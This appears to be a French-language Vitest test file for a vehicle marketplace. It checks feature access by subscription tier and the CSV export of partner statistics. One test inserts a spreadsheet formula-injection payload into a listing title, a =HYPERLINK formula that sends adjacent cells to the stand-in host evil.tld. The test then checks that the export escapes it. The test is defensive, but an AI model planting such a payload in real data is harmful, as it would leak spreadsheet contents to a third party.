import { describe, it, expect } from "vitest";
import { planOuvre, seatsDuPlan, slaHeuresDuPlan, FEATURE_MIN_PLAN } from "../constants/planFeatures.js";
import { planActifDe, planEffectif } from "../services/planAccess.js";
import { exportPartnerInsights } from "../controllers/subscriptionController.js";
import Subscription from "../models/Subscription.js";
import { createUser, createVehicleDoc } from "./helpers/fixtures.js";
import { mockReqRes } from "./helpers/mockReqRes.js";

const abonner = async (user, plan, { actif = true, expire = false } = {}) =>
  Subscription.create({
    vendor: user._id, plan,
    planDetails: {
      startDate: new Date(), isActive: actif, priceUSD: 19.99,
      endDate: new Date(Date.now() + (expire ? -1 : 30) * 86400000),
    },
  });

describe("Matrice des fonctionnalités par palier", () => {
  it("un palier supérieur hérite de tout ce qu'ouvre un palier inférieur", async () => {
    // Le vrai risque de ce genre de table est d'énumérer les paliers à la main
    // et d'en oublier un : « exportateur » absent de la liste d'une
    // fonctionnalité ouverte à « business » ferait payer plus cher pour moins.
    for (const feature of Object.keys(FEATURE_MIN_PLAN)) {
      if (planOuvre("business", feature)) {
        expect(planOuvre("exportateur", feature), feature).toBe(true);
      }
      if (planOuvre("individuel_plus", feature)) {
        expect(planOuvre("business", feature), feature).toBe(true);
      }
    }
  });

  it("le palier gratuit n'ouvre AUCUNE fonctionnalité de palier", async () => {
    for (const feature of Object.keys(FEATURE_MIN_PLAN)) {
      expect(planOuvre("free", feature), feature).toBe(false);
      expect(planOuvre(null, feature), feature).toBe(false);
      expect(planOuvre(undefined, feature), feature).toBe(false);
    }
  });

  it("une fonctionnalité inconnue est REFUSÉE, jamais ouverte par défaut", async () => {
    // Une faute de frappe dans un appel (« acces_api » au lieu de « accesApi »)
    // doit fermer la porte, pas l'ouvrir. C'est le motif de faille le plus
    // courant de ce dépôt : la garde ouverte par défaut.
    expect(planOuvre("exportateur", "accesAPI")).toBe(false);
    expect(planOuvre("exportateur", "")).toBe(false);
  });

  it("l'API est réservée au palier Exportateur, l'équipe démarre à Business", async () => {
    expect(planOuvre("business", "accesApi")).toBe(false);
    expect(planOuvre("exportateur", "accesApi")).toBe(true);
    expect(planOuvre("individuel_plus", "multiUtilisateurs")).toBe(false);
    expect(planOuvre("business", "multiUtilisateurs")).toBe(true);
  });

  it("les sièges et le délai de réponse progressent avec le palier", async () => {
    expect(seatsDuPlan("free")).toBe(1);
    expect(seatsDuPlan("business")).toBeGreaterThan(seatsDuPlan("individuel_plus"));
    expect(seatsDuPlan("exportateur")).toBeGreaterThan(seatsDuPlan("business"));
    expect(slaHeuresDuPlan("exportateur")).toBeLessThan(slaHeuresDuPlan("business"));
    expect(slaHeuresDuPlan("inconnu")).toBe(slaHeuresDuPlan("free"));
  });
});

describe("planEffectif / planActifDe", () => {
  it("un abonnement échu ou désactivé retombe à « free »", async () => {
    const echu = await createUser({ role: "partenaire" });
    await abonner(echu, "exportateur", { expire: true });
    expect(await planEffectif(echu._id)).toBe("free");

    const eteint = await createUser({ role: "partenaire" });
    await abonner(eteint, "exportateur", { actif: false });
    expect(await planEffectif(eteint._id)).toBe("free");

    const sansRien = await createUser({ role: "partenaire" });
    expect(await planEffectif(sansRien._id)).toBe("free");
  });

  it("un abonnement payant en cours renvoie son palier", async () => {
    const p = await createUser({ role: "partenaire" });
    await abonner(p, "business");
    expect(await planEffectif(p._id)).toBe("business");
    expect(planActifDe({ plan: "free", planDetails: { isActive: true, endDate: new Date(Date.now() + 1e6) } })).toBe(false);
  });
});

describe("Export CSV des statistiques", () => {
  it("refuse un palier Individuel+ — l'export commence à Business", async () => {
    const p = await createUser({ role: "partenaire" });
    await abonner(p, "individuel_plus");
    const { req, res } = mockReqRes({ user: p });
    await exportPartnerInsights(req, res);
    expect(res.statusCode).toBe(403);
    expect(res.body.code).toBe("PLAN_REQUIS");
    // Le refus doit nommer le palier qui débloque, sinon le partenaire ignore
    // quoi faire de cette information.
    expect(res.body.message).toMatch(/Business/);
  });

  it("produit un CSV avec en-tête, BOM et une ligne par annonce", async () => {
    const p = await createUser({ role: "partenaire" });
    await abonner(p, "business");
    await createVehicleDoc({ owner: p._id, title: "Hilux double cabine", ville: "Abidjan" });
    await createVehicleDoc({ owner: p._id, title: "Duster", ville: "Abidjan" });

    const { req, res } = mockReqRes({ user: p });
    await exportPartnerInsights(req, res);

    expect(res.statusCode).toBe(200);
    expect(res.body.startsWith("﻿")).toBe(true); // sans BOM, Excel casse les accents
    const lignes = res.body.split("\r\n");
    expect(lignes).toHaveLength(3); // en-tête + 2 annonces
    expect(lignes[0]).toMatch(/Annonce/);
    expect(res.body).toMatch(/Hilux double cabine/);
    expect(res.setHeader).toHaveBeenCalledWith("Content-Type", "text/csv; charset=utf-8");
  });

  it("neutralise une formule de tableur cachée dans un titre d'annonce", async () => {
    // Une cellule commençant par « = » est ÉVALUÉE à l'ouverture du fichier.
    // =HYPERLINK(...) exfiltre les cellules voisines vers un serveur tiers dès
    // que le partenaire ou l'administrateur ouvre son propre export.
    const p = await createUser({ role: "partenaire" });
    await abonner(p, "business");
    await createVehicleDoc({ owner: p._id, title: '=HYPERLINK("https://evil.tld/"&A1,"Facture")' });

    const { req, res } = mockReqRes({ user: p });
    await exportPartnerInsights(req, res);

    expect(res.body).not.toMatch(/(^|,)=HYPERLINK/m);
    expect(res.body).toMatch(/'=HYPERLINK/); // apostrophe d'échappement présente
  });

  it("un titre contenant une virgule ne décale pas les colonnes", async () => {
    const p = await createUser({ role: "partenaire" });
    await abonner(p, "business");
    await createVehicleDoc({ owner: p._id, title: "Hiace, 15 places", ville: "Abidjan" });

    const { req, res } = mockReqRes({ user: p });
    await exportPartnerInsights(req, res);

    const ligne = res.body.split("\r\n")[1];
    // Découpage naïf volontaire : c'est exactement ce que ferait un tableur si
    // la valeur n'était pas mise entre guillemets.
    expect(ligne.startsWith('"Hiace, 15 places"')).toBe(true);
  });
});
